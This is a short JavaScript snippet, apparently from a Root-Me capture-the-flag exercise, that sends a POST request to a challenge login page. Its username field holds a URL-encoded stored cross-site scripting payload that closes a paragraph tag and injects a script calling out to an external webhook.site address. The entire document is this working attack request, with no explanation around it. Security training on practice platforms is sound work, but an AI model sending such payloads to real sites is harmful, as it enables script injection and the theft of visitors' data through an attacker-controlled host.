fetch("http://challenge01.root-me.org:58003/login", {
  method: "POST",
  mode: "cors",
  cache: "no-cache",
  headers: {
		"Content-Type": "application/x-www-form-urlencoded"
  },
	redirect: "follow",
	body: "username=%3C%2Fp%3E%3Cscript%3Efetch%28%22https%3A%2F%2Fwebhook.site%2F9d69f312-1eda-4197-8591-5716250d09fd%22%29%3C%2Fscript%3E&password=qweeee"
})
